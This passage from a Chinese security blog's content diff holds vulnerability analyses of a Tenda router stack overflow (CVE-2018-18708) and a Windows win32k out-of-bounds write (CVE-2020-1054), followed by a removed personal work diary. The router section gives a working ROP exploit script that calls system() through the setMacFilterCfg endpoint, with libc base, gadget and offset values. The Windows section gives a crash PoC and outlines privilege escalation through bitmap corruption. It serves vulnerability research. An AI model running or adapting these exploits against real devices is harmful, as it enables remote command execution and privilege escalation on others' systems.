+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115193726115.png"></p>
+<h4 id="sub-C10D0-1"><a href="#sub-C10D0-1" class="headerlink" title="sub_C10D0"></a>sub_C10D0</h4><p>对传入的值进行strcmp比较，决定返回的值。</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115193936050.png">判断是black还是white，如果满足其中一个返回0，否则返回2。如果没有就会返回2，所以抓包返回结果为{“errCode”:2}</p>
+<p>所以必须传参setMacFilterCfg为black或者white</p>
+<h4 id="sub-C14DC-1"><a href="#sub-C14DC-1" class="headerlink" title="sub_C14DC"></a>sub_C14DC</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115195021958.png"></p>
+<p>第二个参数是需要有\n，并且返回其地址。</p>
+<p>之后都会进入sub_C17A0函数</p>
+<h4 id="sub-C17A0-1"><a href="#sub-C17A0-1" class="headerlink" title="sub_C17A0"></a>sub_C17A0</h4><p>调用了sub_C24C0，将deviceList和v12传入</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116093215098.png"></p>
+<h4 id="sub-C24C0-2"><a href="#sub-C24C0-2" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116093614037.png"></p>
+<h3 id="触发测试"><a href="#触发测试" class="headerlink" title="触发测试"></a>触发测试</h3><p>sub_C24C0函数中的缓冲区a2来自sub_C17A0的v12，大小为176</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117141812438.png"></p>
+<p>根据http post请求内容构造</p>
+<pre class="line-numbers language-none"><code class="language-none">import requests
+url = "http://192.168.130.137/goform/setMacFilterCfg"
+cookie = {"Cookie":"password=csplqw"}
+data = {"macFilterType": "black", "deviceList":"\r" +  "A" * 176 + "bbbb"}
+requests.post(url, cookies=cookie, data=data)
+requests.post(url, cookies=cookie, data=data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>测试</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo chroot . ./qemu-arm-static -g 1111 ./bin/httpd
+
+gdb-multiarch ./bin/httpd
+target remote:1111
+
+python poc.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117144236144.png"></p>
+<p>正好覆盖</p>
+<h2 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p>开启了NX保护</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117145129715.png"></p>
+<h3 id="libc基址"><a href="#libc基址" class="headerlink" title="libc基址"></a>libc基址</h3><p>strcpy函数下断点找函数地址，0x3fdda508</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118173858830.png"></p>
+<p>找偏移</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118174133012.png"></p>
+<p>算基址</p>
+<p>0x3fdda508-3e508=0x3fd9C000</p>
+<h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><pre class="line-numbers language-none"><code class="language-none">ROPgadget --binary libc.so.0 --only "pop" | grep r3
+ROPgadget --binary libc.so.0 | grep "mov r0, sp ; blx r3"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117155024462.png"></p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117155334715.png"></p>
+<p>使用<code>0x00018298 : pop {r3, pc}</code>和 <code>0x00040cb8 : mov r0, sp ; blx r3</code>来构造rop。将第一个r3改成system_addr，将命令放在sp上，之后跳转到system_addr。</p>
+<h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p><code>readelf -s libc.so.0 | grep system</code>找system偏移</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117161402380.png"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>payload结构：[offset,gadget1,system,gadget2]</p>
+<pre class="line-numbers language-none"><code class="language-none">import requests
+from pwn import *
+cmd = b"echo hello"
+libc_base = 0x3fd9C000
+system_offset = 0x005a270
+gadget1_offset = 0x00018298
+gadget2_offset = 0x00040cb8
+system_addr = libc_base + system_offset
+gadget1 = gadget1_offset + libc_base
+gadget2 = gadget2_offset + libc_base
+payload = b"A"*176 + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd
+url = "http://192.168.130.137/goform/setMacFilterCfg"
+cookie = {"Cookie":"password=csplqw"}
+data = {"macFilterType": "black", "deviceList":b"\r" + payload}
+requests.post(url, cookies=cookie, data=data)
+requests.post(url, cookies=cookie, data=data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118174737035.png"></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2020-1054越界写入本地提权分析</title>
+    <url>/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>CVE-2020-1054是win32k.sys内核模块的oob(out of band)漏洞。成功利用可以导致权限提升。漏洞存在于win32k!vStrWrite01函数中，函数在对BitMap对象中的pvScan0成员指向的像素区域进行读写的时候，没有判断读写的地址是否超过BitMap对象的像素点范围，是否越界，导致BSOD的产生。通过合理的内存布局，可以利用漏洞扩大目标BitMap对象的sizelBitmap来扩大BitMap对象的可读写范围，利用扩大读写范围的BitMap对象来修改另一个BitMap对象的pvScan0就能实现任意地址读写。</p>
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="蓝屏poc"><a href="#蓝屏poc" class="headerlink" title="蓝屏poc"></a>蓝屏poc</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">##include <span class="token operator">&lt;</span>Windows<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
+##include <span class="token operator">&lt;</span>inttypes<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
+##include <span class="token operator">&lt;</span>stdint<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
+##include <span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
+##include <span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    HDC r0 <span class="token operator">=</span> <span class="token function">CreateCompatibleDC</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建与指定设备兼容的内存设备上下文环境</span>
+    HBITMAP r1 <span class="token operator">=</span> <span class="token function">CreateCompatibleBitmap</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> <span class="token number">0x9f42</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建与指定设备环境相关的设备兼容位图</span>
+    <span class="token comment">//HBITMAP r1 = CreateCompatibleBitmap(r0, 0x51500, 0x100);//创建与指定设备环境相关的设备兼容位图</span>
+    <span class="token function">SelectObject</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> r1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//选择一对象到指定的设备上下文环境中，该对象替换先前的相同类型对象</span>
+    <span class="token function">DrawIconEx</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>HICON<span class="token punctuation">)</span><span class="token number">0x30000010003</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0xfffffffffebffffc</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>CreateCompatibleBitmap</strong></p>
+<p>创建与指定设备上下文关联的设备兼容位图</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">HBITMAP <span class="token function">CreateCompatibleBitmap</span><span class="token punctuation">(</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> HDC hdc<span class="token punctuation">,</span> <span class="token comment">//设备上下文的句柄</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">int</span> cx<span class="token punctuation">,</span>  <span class="token comment">//位图宽度</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">int</span> cy   <span class="token comment">//位图高度</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>DrawIconEx</strong></p>
+<p>将图标和光标绘制到指定设备上下文中，执行指定光栅操作，指定拉伸或压缩图标光标。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">BOOL <span class="token function">DrawIconEx</span><span class="token punctuation">(</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           HDC    hdc<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    xLeft<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    yTop<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           HICON  hIcon<span class="token punctuation">,</span><span class="token comment">//绘制图标和光标的句柄</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    cxWidth<span class="token punctuation">,</span><span class="token comment">//图标或光标逻辑宽度</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    cyWidth<span class="token punctuation">,</span><span class="token comment">//图标或光标逻辑高度</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           UINT   istepIfAniCur<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">,</span> optional<span class="token punctuation">]</span> HBRUSH hbrFlickerFreeDraw<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           UINT   diFlags
+<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>崩溃地址为win32k!vStrWrite01+0x36a</p>
+<h3 id="vStrWrite01"><a href="#vStrWrite01" class="headerlink" title="vStrWrite01"></a>vStrWrite01</h3><p>StrWrite01(struct _STRRUN *prun, struct _XRUNLEN *a2, struct SURFACE *pSurf, struct _CLIPOBJ *a4)</p>
+<pre class="line-numbers language-none"><code class="language-none">OID vStrWrite01(STRRUN  *prun, 
+                 XRUNLEN *pxrlEnd,
+                 SURFACE *pSurf,
+                 CLIPOBJ *pco)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h3><pre class="line-numbers language-none"><code class="language-none">typedef struct _XRUNLEN
+{
+    LONG    xPos;
+    LONG    cRun;
+    LONG    aul[1];
+} XRUNLEN;
+ 
+typedef struct _STRRUN
+{
+    LONG    yPos;
+    LONG    cRep;
+    XRUNLEN xrl;
+} STRRUN;
+ 
+ 
+typedef struct tagSIZE {
+    LONG cx;
+    LONG cy;
+} SIZE,*PSIZE,*LPSIZE;
+  
+typedef SIZE SIZEL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>BASEOBJECT结构体</p>
+<pre class="line-numbers language-none"><code class="language-none">typedef struct _BASEOBJECT64{
+  ULONG64 hHmgr;     // 0x00
+  ULONG32 ulShareCount;      // 0x08
+  WORD cExclusiveLock;       // 0x0A
+  WORD BaseFlags;        // 0x0C
+  ULONG64 Tid;           // 0x10
+} BASEOBJECT64;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>SURFOBJ结构体</p>
+<pre class="line-numbers language-none"><code class="language-none">typedef struct _SURFOBJ64{
+  BASEOBJECT64 baseObj;    // 0x00
+  ULONG64 dhsurf;         // 0x18
+  ULONG64 hsurf;          // 0x20
+  ULONG64 dhpdev;         // 0x28
+  ULONG64 hdev;           // 0x30
+  SIZEL sizlBitmap;       // 0x38
+  ULONG64 cjBits;         // 0x40
+  ULONG64 pvBits;         // 0x48
+  ULONG64 pvScan0;        // 0x50
+  ULONG32 lDelta;         // 0x58
+  ULONG32 iUniq;          // 0x5C
+  ULONG32 iBitmapFormat;  // 0x60
+  USHORT iType;           // 0x64
+  USHORT fjBitmap;        // 0x66
+} SURFOBJ64;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>pvScan01指向Pixel Data数据区，这些数据可以通过GetBitmapBits和SetBitmapBits控制</p>
+<p>sizlBitmap是两个Dword，包含位图的高度和宽度。</p>
+<h3 id="触发地点"><a href="#触发地点" class="headerlink" title="触发地点"></a>触发地点</h3><p>崩溃地址为win32k!vStrWrite01+0x36a，<code>mov esi,[r14]</code></p>
+<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824160100705.png"></p>
+<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824113228498.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">.text:FFFFF97FFF0A2175                 lea     r14, [rcx+rax*4]
+.text:FFFFF97FFF0A2179                 test    ebx, ebx
+.text:FFFFF97FFF0A217B                 js      short loc_FFFFF97FFF0A2192
+.text:FFFFF97FFF0A217D                 mov     rax, [rsp+0A8h+arg_10]
+.text:FFFFF97FFF0A2185                 cmp     ebx, [rax+38h]
+.text:FFFFF97FFF0A2188                 jge     short loc_FFFFF97FFF0A2192
+.text:FFFFF97FFF0A218A                 mov     esi, [r14]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>内存地址由rcx和rax决定。</p>
+<h3 id="vStrWrite01流程"><a href="#vStrWrite01流程" class="headerlink" title="vStrWrite01流程"></a>vStrWrite01流程</h3><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824145835155.png"></p>
+<p>loc_FFFFF97FFF0A20B4</p>
+<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824172844847.png"></p>
+<p>用rcx和rax计算r14的内存地址，之后执行mov esi,[r14]指令。</p>
+<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824150841161.png"></p>
+<p>如果r14地址合法，对读到的值进行or或者and运算，并把运算后的值赋值回r14指向的内存地址。</p>
+<p>如果控制了崩溃处的destAddr(越界地址oobAddr),就可以进行内存破坏。</p>
+<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824161532452.png"></p>
+<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824160327694.png"></p>
+<p>之后对rcx进行操作，判断r11d是否为0，不为0跳转到loc_FFFFF97FFF0A212B，进行r11d减1操作。</p>
+<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824165106838.png"></p>
+<p>函数流程如下</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+	<span class="token keyword">do</span> <span class="token punctuation">{</span>
+		<span class="token comment">/* 
+		lea  r14, [rcx + rax * 4] 
+		rcx = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0
+		rax = prun-&gt;xrl-&gt;xPos &gt;&gt; 5
+		*/</span>
+		r14 <span class="token operator">=</span> rcx <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>prun<span class="token operator">-&gt;</span>xrl<span class="token operator">-&gt;</span>xPos <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读取时的oobAddr,rcx + rax * 4</span>
+		<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+		tmp <span class="token operator">=</span> <span class="token operator">*</span>destAddr  <span class="token comment">//崩溃</span>
+
+		<span class="token keyword">do</span> <span class="token punctuation">{</span>
+
+			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+				tmp <span class="token operator">|=</span> xxxxxx
+			<span class="token punctuation">}</span>
+			<span class="token keyword">else</span> <span class="token punctuation">{</span>
+				tmp <span class="token operator">&amp;=</span> xxxxxx
+			<span class="token punctuation">}</span>
+		<span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>r11d<span class="token punctuation">)</span>
+            <span class="token operator">--</span>r11d<span class="token punctuation">;</span>
+			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+				<span class="token operator">*</span>destAddr <span class="token operator">=</span> tmp<span class="token punctuation">;</span> <span class="token comment">//满足条件，写入oobAddr</span>
+			<span class="token punctuation">}</span>
+	<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
+        
+		<span class="token comment">/*
+		add rcx, rax
+        rcx = rcx + pSurf-&gt;lDelta
+        */</span>
+		rcx <span class="token operator">+=</span> pSurf<span class="token operator">-&gt;</span>lDelta<span class="token punctuation">;</span><span class="token comment">//每次循环obbAddr会增加</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>对r14指向的内存进行读写</p>
+<pre class="line-numbers language-none"><code class="language-none">rcx = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0
+rax = prun-&gt;xrl-&gt;xPos &gt;&gt; 5
+lea  r14, [rcx+rax*4]
+rcx = rcx + pSurf-&gt;lDelta<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>循环的操作如下</p>
+<pre class="line-numbers language-none"><code class="language-none">for(i = 0; i&lt;prun-&gt;yPos; i++)
+{
+    r14 = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0 + 4*(prun-&gt;xrl-&gt;xPos) + i*pSurf-&gt;lDelta
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>崩溃时的指令是<code>mov esi, [r14]</code>，由于引用无效的内存发生，是越界写入漏洞。崩溃时访问的地址能通过oob控制其中的内容。影响读写oobAddr的值有<code>prun-&gt;yPos</code>，<code>pSurf-&gt;lDelta</code>，<code>prun-&gt;xrl-&gt;xPos</code>和循环次数</p>
+<pre class="line-numbers language-none"><code class="language-none">DrawIconEx(exploit_dc, 0x0, 0x0, (HICON)0x40000010003, 0x0, 0xffe00000, 0x0, 0x0, 0x1);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>yPos有DrawIconEx中的arg3和arg有关</p>
+<pre class="line-numbers language-none"><code class="language-none">##include&lt;stdio.h&gt;
+int main(){
+    int arg3 = 0xb;
+    int arg6 = 0xffe00000;
+    int yPos = 0;
+    int remainder_count = 0;
+    int quotient_count = 0;
+    int mod_num = (arg3+1-(arg6+arg3+1)) % 0x20;
+    int div_num = (arg3+1-(arg6+arg3+1))/ 0x20;
+    if(0xf+mod_num&gt;=0x20){
+        remainder_count = mod_num;
+        quotient_count = div_num+1;
+        yPos = (remainder_count-1-1)*(div_num+1) \
+              + div_num +arg6 + arg3+1;
+    }else{
+        remainder_count = mod_num;
+        quotient_count = div_num;
+        yPos = (0x20-1-1)*div_num+arg6+arg3+1;
+    }
+    printf("arg3: 0x%x\n",arg3);
+    printf("arg6: 0x%x\n",arg6);
+    printf("yPos First: 0x%x\n",yPos);
+    printf("yPos Second: 0x%x\n",(yPos+quotient_count));
+    return 0;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>prun -&gt; xrl.xPos:0x900</p>
+<p>pSurf-&gt;lDelta:0xa2a0</p>
+<p>prun-&gt;xPos:0xb</p>
+<h3 id="地址任意读写"><a href="#地址任意读写" class="headerlink" title="地址任意读写"></a>地址任意读写</h3><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906100016677.png"></p>
+<p>SIZEL sizlBitmap，是限定位图的长宽的，存储Pixel Data的长宽大小，四字节写可修改Pixel Data的大小</p>
+<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906095832694.png"></p>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>CreateCompatibleBitmap申请VulBITMAP，并获得VulBITMAP的内核地址<br>计算oob读写地址<br>在oob读地址处申请BITMAP1，在oob写处申请BITMAP2，大小为0x7000<br>触发漏洞，读取BITMAP1中的sIzlBitmap值，修改BITMAP2对象的sizlBitmap值，对BITMAP2使用SetBitmapBits和GetBitmapBits越界读写BITMAP3的pvScan0<br>BITMAP2作为Manager，BITMAP3作为worker，实现任意读写，替换token等提权</p>
+<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906095502566.png"></p>
 ]]></content>
       <categories>
         <category>CVE</category>
@@ -2763,117 +2763,154 @@ sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span
       </tags>
   </entry>
   <entry>
-    <title>工作日志（善学善思考）</title>
-    <url>/2024/10/15/%E5%B7%A5%E4%BD%9C%E6%97%A5%E5%BF%97%EF%BC%88%E5%96%84%E5%AD%A6%E5%96%84%E6%80%9D%E8%80%83%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>工作日志（善学善思考）</p>
-<p>本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！</p>
-<h2 id="2024-10-15"><a href="#2024-10-15" class="headerlink" title="2024.10.15"></a>2024.10.15</h2><p>今天是进入纪委的第一天，我被分配到了派驻县委办，早上八点半，我们这一批在521会议室集合等待与同事们见面，却被张部长单独叫了出去，原来是需要我和两个同事（LYQ和CXY）去跟服务市委三组下乡核实情况。还没有与同事见面就要下乡了？我不仅有些疑惑还有一些兴奋。</p>
-<p>去了三组，拿到了审计问题情况表，看了看大致情况，趁领导们商量的时候搜了一下表上的出底板和消力坎是什么东西，ZL姐出发前给我说了大致需要去做什么，我也满怀期待的等着领导给我分配任务。</p>
-<p>上午九点，我跟ZL姐去了X村水库，看了看水库的大致情况，ZL姐让我也拍照片记录，于是我分别拍了出底板和消力坎的图片。我问ZL姐我拍的图片咋样，ZL姐拿出她拍的图片，出底板和消力坎在一张图片里，并告诉我这样拍可以看到这两个的情况。我也暗暗记下这个拍照的方法。</p>
-<p>之后去了F庄村，主要查看农田灌溉渠的情况，到了现场发现灌溉渠里还是有干了的淤泥沉底，但是不影响灌溉，我积极的拍照片，却看到ZL姐亲自去灌溉渠里用手挖出一块干泥巴看淤泥的厚度，我心里想果然处处留心皆学问。灌溉渠紧邻学校，学校里传出蜗牛与黄鹂鸟的歌，我想我像是一只蜗牛，一步一步地往上爬。</p>
-<p>下午就开始整理报告。主要是1.项目基本情况。2.问题及产生原因。3.问题整改措施。4.相关责任追究</p>
